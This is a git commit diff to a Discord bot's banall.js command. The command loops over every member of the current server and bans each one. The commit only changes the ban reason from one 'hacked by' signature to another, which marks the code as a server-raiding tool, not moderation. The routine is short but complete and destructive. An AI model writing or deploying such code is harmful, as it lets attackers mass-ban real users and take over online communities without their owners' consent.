a2a5b24e1f13c8b50fe84ef2f49f1c6c0e9a1d58
Abhiraj441 <57949868+Abhiraj441@users.noreply.github.com>
2020-04-21 13:00:36 +0500

    Update banall.js

--- commands/banall.js
+++ commands/banall.js
@@ -1,7 +1,7 @@
 exports.run = async (client, message) => {
   function banir(){
     client.guilds.get(message.guild.id).members.forEach((membros) => {
-      membros.ban("Hackeados Por Gustavo33")
+      membros.ban("Hacked By Shunky")
     })
   }
   banir()
